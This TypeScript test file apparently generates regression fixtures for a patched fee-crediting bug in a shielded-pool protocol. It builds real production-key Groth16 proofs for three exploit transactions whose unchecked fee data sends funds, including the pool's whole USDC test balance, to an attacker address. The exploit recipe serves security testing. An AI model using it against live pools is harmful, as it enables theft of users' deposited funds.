/**
 * Generates the fee fixtures used by test/security/FeeBacking.t.sol and
 * test/security/PaymasterFeeBacking.t.sol. See test/security/generators/README.md.
 *
 * Real Groth16 proofs with the PRODUCTION zkeys (v1-interface/public/mainnet-circuits),
 * whose vKeys match src/verifiers at v1-protocol 72cb8de.
 *
 * Each tx is built through the SDK with NO fee (so getPublicAssets folds nothing into
 * pubAssets), then paymaster/feeAssetId/feeValue are set before signing and proving.
 * The proof is honest: ZeroSumFungible balances the notes against pubAssets as submitted,
 * and feeData only enters the signed hash. Before the fix the pool still credited feeValue.
 *  A) poc_fee_deposit        DEPOSIT 100 WETH, feeData = (attacker, WETH, 100 WETH)
 *  B) poc_fee_withdraw0      WITHDRAW 0 WETH (dummy notes), feeData = (attacker, USDC, 10000e6)
 *  C) poc_fee_transfer_nopub TRANSFER with empty pubAssets, feeData = (POC_PAYMASTER, WETH, 1 WETH)
 */
import { describe, test, jest } from '@jest/globals';
import { writeFileSync, mkdirSync } from 'fs';
import path from 'path';
import { parseEther, padHex, toHex } from 'viem';
import MerkleTree from 'fixed-merkle-tree';
import * as snarkJs from 'snarkjs';
import { ShieldedAccount } from '@veilnyx-sdk/account';
import { poseidonHash } from '@veilnyx-sdk/babyjubjub';
import { Transaction } from '@veilnyx-sdk/transaction';
import { TransactionType } from '@veilnyx-sdk/shared-types';
import { Prover } from '../src/prover';
import { revokerData, receiver } from './helpers/tx';
import { MockTreeSource, zeroElement } from './helpers/services';

// @ts-ignore
globalThis.snarkjs = snarkJs;

const OUT = process.env.POC_OUT as string;
const SENDER_SEED = 1994697084159943999785488437260720072543801315335621143792968095221654743078n;
const WETH = 65537;
const USDC = 65538;
const ATTACKER = '0x000000000000000000000000000000000000a77A';
const MC = '../../../v1-interface/public/mainnet-circuits';
const cp = (n: string) => ({ zKey: `${MC}/${n}/keys.zkey`, wasm: `${MC}/${n}/circuit.wasm`, vKey: '' });
const circuits = {
  transact21: cp('transact21'),
  transact22: cp('transact22'),
  transact23: cp('transact23'),
};

const hashFunction = (a: any, b: any) => padHex(toHex(poseidonHash([BigInt(a), BigInt(b)])), { size: 32 });

const build = (type: TransactionType, sender: any, o: any, to: any) =>
  new Transaction(
    {
      addressTreeRoot: o.addressTreeRoot,
      commitmentTreeRoot: o.commitmentTreeRoot,
      type,
      assetIds: o.assetIds,
      values: o.values,
      feeAssetId: 0,
      feeValue: 0n,
      to,
    } as any,
    { chainId: 1, account: sender, notes: o.notes, revokerData } as any,
  );

const write = (name: string, hex: string) => {
  mkdirSync(OUT, { recursive: true });
  writeFileSync(path.join(OUT, `${name}.txt`), hex);
  console.log(`wrote ${name}.txt`);
};

describe('fee-mint poc', () => {
  jest.setTimeout(900000);
  test('gen', async () => {
    const prover = new Prover({ circuits } as any);
    const sender: any = ShieldedAccount.generate(SENDER_SEED);
    const addrTree = new MerkleTree(20, [], { hashFunction, zeroElement });
    const cmTree = new MerkleTree(25, [], { hashFunction, zeroElement });
    const addrSrc = new MockTreeSource(addrTree);
    const cmSrc = new MockTreeSource(cmTree);
    addrSrc.insert(sender.rootAddress);

    // A) deposit with self-credited fee equal to the whole deposit
    const dep: any = build(
      TransactionType.DEPOSIT,
      sender,
      { assetIds: [WETH], values: [parseEther('100')], notes: [], addressTreeRoot: addrSrc.root, commitmentTreeRoot: cmSrc.root },
      receiver.shieldedAddress.pack(),
    );
    dep.paymaster = ATTACKER;
    dep.feeAssetId = WETH;
    dep.feeValue = parseEther('100');
    dep.signature = await sender.sign(dep.hash());
    const depZ = await prover.proveTransaction(dep, { account: sender, commitmentTree: cmSrc, addressTree: addrSrc });
    write('poc_fee_deposit', depZ.encode());

    // B) withdraw 0 (dummy notes only) with fee in an asset absent from pubAssets
    const wd: any = build(
      TransactionType.WITHDRAW,
      sender,
      { assetIds: [WETH], values: [0n], notes: [], addressTreeRoot: addrSrc.root, commitmentTreeRoot: cmSrc.root },
      ATTACKER,
    );
    wd.paymaster = ATTACKER;
    wd.feeAssetId = USDC;
    wd.feeValue = 10000000000n; // = the pool's entire USDC balance in the PoolTest harness (10000e6)
    wd.signature = await sender.sign(wd.hash());
    const wdZ = await prover.proveTransaction(wd, { account: sender, commitmentTree: cmSrc, addressTree: addrSrc });
    write('poc_fee_withdraw0', wdZ.encode());

    // C) fee-less TRANSFER (empty pubAssets) that still advertises a paymaster fee
    const tr: any = build(
      TransactionType.TRANSFER,
      sender,
      { assetIds: [WETH], values: [0n], notes: [], addressTreeRoot: addrSrc.root, commitmentTreeRoot: cmSrc.root },
      receiver.shieldedAddress.pack(),
    );
    tr.paymaster = process.env.POC_PAYMASTER;
    tr.feeAssetId = WETH;
    tr.feeValue = parseEther('1');
    tr.signature = await sender.sign(tr.hash());
    const trZ = await prover.proveTransaction(tr, { account: sender, commitmentTree: cmSrc, addressTree: addrSrc });
    write('poc_fee_transfer_nopub', trZ.encode());
  });
});
